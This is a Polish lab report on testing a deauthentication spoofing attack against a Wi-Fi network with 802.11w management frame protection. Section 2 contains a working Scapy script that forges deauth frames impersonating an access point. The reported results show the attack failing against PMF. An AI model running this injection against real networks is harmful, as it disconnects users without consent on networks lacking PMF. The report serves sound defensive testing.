# 04 — Atak: Deauth Spoofing

**Data:** 30-31 maja 2026  

## 1. Opis ataku

Atak Deauth Spoofing polega na wyslaniu do stacji-klienta sfalszowanej ramki deauthentication (802.11 subtype 12), podszywajacej sie pod legalny Access Point. Ramka deauthentication jest klasyfikowana przez 802.11w jako **Robust Management Frame** — powinna byc chroniona przez PMF.

Mechanizm PMF chroni ramke deauth poprzez dodanie do niej Message Integrity Code (MIC), obliczonego przy uzyciu klucza IGTK (Integrity Group Temporal Key). Klient po otrzymaniu ramki deauth weryfikuje MIC — jesli jest niepoprawny lub go brak, ramka jest odrzucana.

## 2. Implementacja

Ramka deauth konstruowana jest przy uzyciu biblioteki Scapy:

```python
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

frame = RadioTap() / Dot11(
    type=0, subtype=12,       # Management / Deauthentication
    addr1='{target_mac}',     # Destination = stacja-ofiara
    addr2='{ap_mac}',         # Source = sfalszowany adres AP
    addr3='{ap_mac}',         # BSSID
) / Dot11Deauth(reason=7)     # Reason: Class 3 frame from nonassociated STA

sendp(frame, iface='wlan0', count=3, inter=0.1, verbose=True)
```

Atakujacy NIE dodaje MIC do ramki, poniewaz nie zna klucza IGTK — symuluje tym samym realny scenariusz, w ktorym atakujacy spoza sieci probuje rozlaczyc klienta.

## 3. Wyniki

| Parametr | Wartosc |
|----------|---------|
| Liczba wyslanych ramek | 3 |
| Interwal | 100ms |
| Hostapd | 2.6 i 2.10 |
| Status stacji przed atakiem | ASSOCIATED |
| Status stacji po ataku | STILL ASSOCIATED |

```
=== Post-Attack Association Check ===
  sta1: STILL ASSOCIATED

[PASS] PMF protection working.
       Unprotected deauth frame was rejected by station.
```

**Wynik:** Atak **NIESKUTECZNY**. Stacja odrzucila sfalszowane ramki deauth. PMF dziala poprawnie.

## 4. Analiza

Ramki deauth zostaly wyslane (scapy potwierdzilo transmisje przez `>` w output), ale stacja je zignorowala. Wireshark potwierdza, ze wyslane ramki nie zawieraja elementu MIC (Message Integrity Code), ktory jest wymagany dla ramek Robust Management przy PMF=required.

Brak MIC w ramce deauth powoduje, ze stacja (wpa_supplicant z `ieee80211w=2`) odrzuca ramke na podstawie weryfikacji integralnosci. Jest to zgodne ze specyfikacja 802.11w.

---

**[screenshot: Wireshark — ramka deauth wyslana przez atakujacego (bez MIC)]**  
**[screenshot: Wireshark — ramka deauth z poprawnym MIC (dla porownania, z legalnego AP)]**  
**[screenshot: Terminal — output test_pmf.py pokazujacy PASS]**
